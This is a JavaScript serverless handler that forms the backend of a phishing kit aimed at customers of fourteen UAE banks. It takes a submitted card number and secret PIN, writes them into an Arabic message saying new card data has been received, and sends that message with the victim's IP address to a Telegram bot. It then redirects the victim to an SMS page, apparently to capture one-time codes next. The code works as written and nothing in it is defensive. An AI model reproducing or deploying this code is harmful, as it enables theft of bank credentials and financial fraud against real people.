const axios = require('axios');

const banks = {
    '1': 'Mashreq Bank',
    '2': 'Dubai Islamic Bank',
    '3': 'Ajman Bank',
    '4': 'ADIB',
    '5': 'ADCB',
    '6': 'HSBC',
    '7': 'FAB',
    '8': 'Sharjah Islamic Bank',
    '9': 'Emirates Islamic',
    '10': 'NBF',
    '11': 'CBI',
    '12': 'RAKBANK',
    '13': 'Commercial Bank of Dubai',
    '14': 'NBD',
};

exports.handler = async function(event) {
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed' };
    }

    try {
        const params = new URLSearchParams(event.body);
        const s1 = params.get('s1') || 'N/A';
        const s2 = params.get('s2') || 'N/A';
        const bank_id = params.get('bank_id') || 'unknown';

        const bank_name = banks[bank_id] || 'Unknown Bank';
        const user_ip = event.headers['client-ip'] || 'N/A';

        const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = process.env;

        const message = `تم استلام بيانات بطاقة جديدة (${bank_name} - ${bank_id}):\n\nرقم البطاقة: ${s1}\nالرقم السري: ${s2}\nIP: ${user_ip}`;

        if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            await axios.post(url, {
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
            });
        }

        return {
            statusCode: 302,
            headers: {
                'Location': '/bank_select/banks/sms.html',
            },
        };
    } catch (error) {
        console.error('Error:', error);
        return {
            statusCode: 500,
            body: `Error: ${error.message}`,
        };
    }
};
